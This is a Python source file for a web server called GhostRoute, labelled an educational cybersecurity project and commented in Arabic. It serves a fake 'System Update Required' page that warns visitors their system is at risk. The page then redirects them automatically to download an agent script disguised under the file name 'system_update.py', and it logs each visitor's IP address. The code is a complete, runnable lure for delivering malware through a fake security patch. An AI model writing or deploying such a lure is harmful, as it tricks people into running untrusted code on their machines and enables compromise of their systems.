#!/usr/bin/env python3
"""
GhostRoute - HTTP Distribution Server
Educational Project - Cyber Security
"""

import http.server
import socketserver
import os
import argparse
import json
import sys
import logging
from urllib.parse import urlparse

# ==================== إعداد السجل ====================

def setup_logging(level="INFO", log_file="ghost_http.log"):
    """إعداد نظام تسجيل الأحداث."""
    numeric_level = getattr(logging, level.upper(), logging.INFO)
    logging.basicConfig(
        level=numeric_level,
        format='[%(asctime)s] %(levelname)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("GhostHTTP")

# ==================== معالج HTTP ====================

class GhostHTTPHandler(http.server.SimpleHTTPRequestHandler):
    """معالج HTTP مخصص."""
    
    logger = None
    
    def do_GET(self):
        """معالجة طلبات GET."""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/':
            self.send_homepage()
        elif parsed_path.path == '/download':
            self.send_download_page()
        elif parsed_path.path == '/ghost_agent.py':
            self.send_agent_file()
        else:
            super().do_GET()
    
    def send_homepage(self):
        """إرسال الصفحة الرئيسية."""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Update Required</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                    text-align: center;
                    max-width: 450px;
                }
                h1 { color: #333; margin-bottom: 10px; }
                .warning {
                    background: #fff3cd;
                    border: 1px solid #ffc107;
                    padding: 15px;
                    border-radius: 5px;
                    margin: 20px 0;
                    color: #856404;
                }
                .download-btn {
                    background: #667eea;
                    color: white;
                    padding: 15px 30px;
                    border: none;
                    border-radius: 5px;
                    font-size: 18px;
                    cursor: pointer;
                    transition: background 0.3s;
                    text-decoration: none;
                    display: inline-block;
                }
                .download-btn:hover { background: #5a67d8; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>System Update Required</h1>
                <p>Your system requires an important security update.</p>
                <div class="warning">
                    <strong>Warning:</strong> Your system is at risk if not updated.
                </div>
                <a href="/download">
                    <button class="download-btn">Download Update</button>
                </a>
                <p style="margin-top: 20px; color: #666; font-size: 14px;">
                    Version 2.1 - Security Patch
                </p>
            </div>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(html.encode()))
        self.end_headers()
        self.wfile.write(html.encode())
        
        if self.logger:
            self.logger.info(f"Homepage served to {self.client_address[0]}")
    
    def send_download_page(self):
        """إرسال صفحة التحميل."""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Downloading Update...</title>
            <meta charset="UTF-8">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: #f5f5f5;
                    text-align: center;
                    padding: 50px;
                }
                .loader {
                    border: 5px solid #f3f3f3;
                    border-top: 5px solid #667eea;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                h2 { color: #333; }
            </style>
        </head>
        <body>
            <h2>Preparing your update...</h2>
            <div class="loader"></div>
            <p>Your download will start automatically</p>
            <script>
                setTimeout(function() {
                    window.location.href = '/ghost_agent.py';
                }, 2000);
            </script>
        </body>
        </html>
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(html.encode()))
        self.end_headers()
        self.wfile.write(html.encode())
        
        if self.logger:
            self.logger.info(f"Download page served to {self.client_address[0]}")
    
    def send_agent_file(self):
        """إرسال ملف العميل."""
        agent_file = "ghost_agent.py"
        
        if os.path.exists(agent_file):
            with open(agent_file, 'rb') as f:
                file_data = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', 'attachment; filename="system_update.py"')
            self.send_header('Content-Length', len(file_data))
            self.end_headers()
            self.wfile.write(file_data)
            
            if self.logger:
                self.logger.info(f"Agent file sent to {self.client_address[0]}")
        else:
            self.send_error(404, "File not found")
    
    def log_message(self, format, *args):
        """تسجيل مخصص."""
        if self.logger:
            self.logger.info(f"{self.client_address[0]} - {format % args}")
        else:
            super().log_message(format, *args)

# ==================== خادم HTTP ====================

class GhostHTTPServer:
    """خادم توزيع GhostRoute."""
    
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.server = None
        self.logger = None
    
    def start(self):
        """بدء الخادم."""
        try:
            GhostHTTPHandler.logger = self.logger
            self.server = socketserver.TCPServer((self.host, self.port), GhostHTTPHandler)
            
            print("=" * 50)
            print("  GhostRoute - HTTP Distribution Server")
            print("  Educational Project - Cyber Security")
            print("=" * 50)
            print(f"  Server: http://{self.host}:{self.port}")
            print("=" * 50)
            
            self.logger.info(f"HTTP server started on {self.host}:{self.port}")
            
            self.server.serve_forever()
        except PermissionError:
            self.logger.error("Permission denied. Try using a port above 1024.")
            sys.exit(1)
        except OSError as e:
            self.logger.error(f"Failed to start server: {e}")
            sys.exit(1)
    
    def stop(self):
        """إيقاف الخادم."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.logger.info("HTTP server stopped.")

# ==================== تحليل الأوامر ====================

def parse_arguments():
    """تحليل وسائط سطر الأوامر."""
    parser = argparse.ArgumentParser(
        description="GhostRoute - HTTP Distribution Server",
        epilog="Educational Project - Cyber Security"
    )
    
    parser.add_argument("--host", default="0.0.0.0", help="Server host")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--config", default="http_config.json", help="Configuration file")
    parser.add_argument("--log-level", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], default="INFO", help="Logging level")
    parser.add_argument("--version", action="version", version="GhostRoute HTTP Server v1.0.0")
    
    return parser.parse_args()

# ==================== قراءة الإعدادات ====================

def load_config(config_file):
    """قراءة ملف الإعدادات."""
    if not os.path.exists(config_file):
        return {}
    
    try:
        with open(config_file, "r", encoding="utf-8") as f:
            return json.load(f)
    except json.JSONDecodeError:
        print(f"[!] Error: Configuration file '{config_file}' is corrupted.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

# ==================== الدالة الرئيسية ====================

def main():
    """الدالة الرئيسية."""
    args = parse_arguments()
    config = load_config(args.config)
    
    host = args.host
    port = args.port
    log_file = config.get("log_file", "ghost_http.log")
    
    logger = setup_logging(args.log_level, log_file)
    
    server = GhostHTTPServer(host, port)
    server.logger = logger
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.stop()

if __name__ == "__main__":
    main()